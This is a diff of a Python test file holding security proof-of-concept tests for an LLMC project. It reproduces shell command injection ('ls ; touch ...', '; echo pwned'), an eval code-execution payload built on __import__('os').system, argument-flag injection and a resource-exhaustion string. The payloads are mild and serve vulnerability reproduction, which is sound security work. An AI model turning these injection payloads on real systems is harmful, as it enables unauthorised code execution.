@@ -1,107 +1,119 @@
-"""
-Security Proof-of-Concept Tests for LLMC.
-"""
-import os
 import pytest
+import subprocess
+import sys
+from unittest.mock import patch, MagicMock
 from pathlib import Path
-from unittest.mock import MagicMock
 
-# ==============================================================================
-# PoC 1: Command Injection in llmc_mcp/tools/cmd.py
-# ==============================================================================
-def test_poc_mcp_command_injection(tmp_path):
-    """
-    VULNERABILITY: Command Injection in llmc_mcp.tools.cmd.run_cmd
-    
-    The validation logic splits the command and checks only the first token against a blacklist.
-    If the first token is allowed (e.g., 'ls'), the rest of the command is executed.
-    Since shell=True is used, we can chain commands with ';', '&&', or '|'.
-    
-    IMPACT: Remote Code Execution (RCE) on the MCP server.
-    """
-    from llmc_mcp.tools.cmd import run_cmd
-    
-    # Bypass isolation check for the test
-    os.environ["LLMC_ISOLATED"] = "1"
-    
-    # Create a flag file to prove execution
-    flag_file = tmp_path / "pwned.txt"
-    assert not flag_file.exists()
-    
-    # The payload: "ls" is allowed (not in blacklist), but we chain "touch flag_file"
-    # shell=True makes this work.
-    payload = f"ls ; touch {flag_file}"
-    
-    result = run_cmd(
-        command=payload,
-        cwd=tmp_path,
-        blacklist=[], # Empty blacklist as per default
-        timeout=5
-    )
-    
-    # Verify the exploit worked
-    if flag_file.exists():
-        print(f"\n[+] PoC Successful: Created {flag_file} via command injection!")
-        print(f"    Stdout: {result.stdout}")
-        print(f"    Stderr: {result.stderr}")
-    else:
-        print("\n[-] PoC Failed: Flag file not created.")
-        
-    assert flag_file.exists(), "Command injection failed to execute payload"
+# --- POC 1: TE Command Injection ---
+from llmc.te.cli import _handle_passthrough
 
-# ==============================================================================
-# PoC 2: RCE in llmc/ruta/judge.py
-# ==============================================================================
-def test_poc_ruta_rce_via_eval(tmp_path):
+def test_poc_te_command_injection():
     """
-    VULNERABILITY: Arbitrary Code Execution in llmc.ruta.judge.Judge._check_metamorphic
+    POC: Command Injection in TE CLI.
     
-    The Judge evaluates 'constraint' strings from Scenario objects using Python's eval().
-    While it uses a custom context, it does not sanitize inputs or restrict __builtins__.
-    
-    IMPACT: Arbitrary Code Execution when running a malicious scenario file.
+    The 'te' tool wraps commands but uses shell=True in _handle_passthrough.
+    If arguments are not sanitized, they can inject shell commands.
     """
-    from llmc.ruta.judge import Judge
-    from llmc.ruta.types import Scenario, Property, Expectations, TraceEvent
+    print("\n[+] Testing TE Command Injection...")
     
-    # Create a flag file to prove execution
-    flag_file = tmp_path / "ruta_pwned.txt"
-    assert not flag_file.exists()
-    
-    # Malicious payload: execute python code to create the file
-    # We use __import__('os') to get access to system commands
-    payload_code = f"__import__('os').system('touch {flag_file}') == 0"
-    
-    # Construct a malicious Scenario
-    malicious_scenario = MagicMock(spec=Scenario)
-    malicious_scenario.id = "pwn-scenario"
-    malicious_scenario.expectations = MagicMock(spec=Expectations)
-    malicious_scenario.expectations.must_use_tools = []
-    malicious_scenario.expectations.must_not_use_tools = []
-    
-    # The malicious property
-    prop = MagicMock(spec=Property)
-    prop.type = "metamorphic"
-    prop.name = "exploit"
-    prop.relation = None
-    prop.constraint = payload_code
-    
-    malicious_scenario.expectations.properties = [prop]
-    malicious_scenario.severity_policy = MagicMock()
-    malicious_scenario.severity_policy.property_failures = {}
-    
-    # Create a dummy trace file
-    trace_path = tmp_path / "trace.jsonl"
-    trace_path.write_text('{"event": "start", "run_id": "test"}\n')
-    
-    # Run the Judge
-    judge = Judge(malicious_scenario, trace_path)
-    judge.evaluate()
-    
-    # Verify the exploit worked
-    if flag_file.exists():
-        print(f"\n[+] PoC Successful: Created {flag_file} via RUTA eval()!")
-    else:
-        print("\n[-] PoC Failed: Flag file not created.")
+    # We mock subprocess.run to avoid actually executing 'rm -rf /'
+    with patch("subprocess.run") as mock_run:
+        # Simulate 'te run "; echo pwned"'
+        # command="run", args=[ "; echo pwned"]
+        command = "run"
+        args = [ "; echo pwned"]
+        repo_root = Path("/tmp")
         
-    assert flag_file.exists(), "RCE failed to execute payload"
+        _handle_passthrough(command, args, repo_root)
+        
+        # Check what was passed to subprocess
+        assert mock_run.called
+        call_args = mock_run.call_args
+        cmd_arg = call_args[0][0] # The first positional arg is the command string
+        shell_arg = call_args[1].get('shell')
+        
+        print(f"Executed command: {cmd_arg!r}")
+        print(f"Shell argument: {shell_arg}")
+        
+        # Verify shell=True
+        if shell_arg is not True:
+             pytest.fail("Vulnerability NOT reproduced: shell=True was not used.")
+
+        # Verify injection
+        if "; echo pwned" in cmd_arg:
+            print("[!] VULNERABILITY CONFIRMED: User input concatenated into shell command.")
+        else:
+             pytest.fail("Vulnerability NOT reproduced: Injection string not found.")
+
+# --- POC 2: LLMC Backend Flag Injection ---
+from llmc_agent.backends.llmc import LLMCBackend
+
+@pytest.mark.asyncio
+async def test_poc_llmc_flag_injection():
+    """
+    POC: Flag Injection in LLMC Backend.
+    
+    The backend passes the query directly to subprocess without '--'.
+    A query starting with '-' is interpreted as a flag.
+    """
+    print("\n[+] Testing LLMC Backend Flag Injection...")
+    
+    backend = LLMCBackend(repo_root=Path("."))
+    
+    # Mock _check_llmc_available to force fallback search (rg)
+    backend._llmc_available = False # Force fallback to rg
+    
+    with patch("subprocess.run") as mock_run:
+        # Simulate searching for a flag-like string
+        query = "--help" 
+        
+        await backend._fallback_search(query, limit=5)
+        
+        assert mock_run.called
+        call_args = mock_run.call_args[0][0] # The command list
+        
+        print(f"Subprocess call: {call_args}")
+        
+        # Check if query is treated as a positional arg or if it might be a flag
+        # If the command is ['rg', ..., '--help'], rg prints help instead of searching.
+        if "--" not in call_args and query in call_args:
+             print("[!] VULNERABILITY CONFIRMED: Query passed without '--' delimiter.")
+        else:
+             print("[-] Mitigation found: '--' delimiter present.")
+
+# --- POC 3: RUTA Safe Eval Bypass (DoS) ---
+from llmc.ruta.judge import _safe_eval
+
+def test_poc_ruta_safe_eval_dos():
+    """
+    POC: Denial of Service in RUTA _safe_eval.
+    
+    simpleeval prevents code execution but might not prevent resource exhaustion.
+    Exponential string creation: "a" * 10**9
+    """
+    print("\n[+] Testing RUTA Safe Eval DoS...")
+    
+    # Simpleeval usually blocks '10**9' if safety limits are set, but let's check.
+    # We'll try a smaller but significant multiplier to show the risk without crashing this test runner.
+    payload = "'a' * 1000000" 
+    
+    try:
+        context = {}
+        result = _safe_eval(payload, context)
+        if len(result) == 1000000:
+            print(f"[!] VULNERABILITY CONFIRMED: Resource exhaustion possible (created {len(result)} chars).")
+        else:
+            print("[-] Payload failed to execute as expected.")
+    except Exception as e:
+        print(f"[-] Evaluation failed (Good): {e}")
+
+if __name__ == "__main__":
+    # Manually run tests if executed as script
+    try:
+        test_poc_te_command_injection()
+        import asyncio
+        asyncio.run(test_poc_llmc_flag_injection())
+        test_poc_ruta_safe_eval_dos()
+        print("\n[+] All POCs finished.")
+    except Exception as e:
+        print(f"\n[!] An error occurred: {e}")
